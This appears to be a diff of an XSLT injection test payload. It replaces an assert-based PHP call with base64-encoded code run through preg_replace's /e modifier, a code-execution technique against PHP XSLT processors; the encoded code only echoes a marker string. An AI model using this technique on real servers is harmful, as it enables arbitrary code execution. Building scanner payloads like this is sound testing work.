@@ -3,7 +3,10 @@
   <xsl:template match="/">
     <html>
       <body>
-        <xsl:value-of select="php:function('assert', 'echo 456789;')" />
+        <xsl:variable name="eval">
+          eval(base64_decode("ZWNobyAiQUFBQUFBQUFBQUFBQUFBQUFBQUEiOwo="))
+        </xsl:variable>
+        <xsl:value-of select="php:function('preg_replace', '/.*/e', $eval, '')" />
       </body>
     </html>
   </xsl:template>
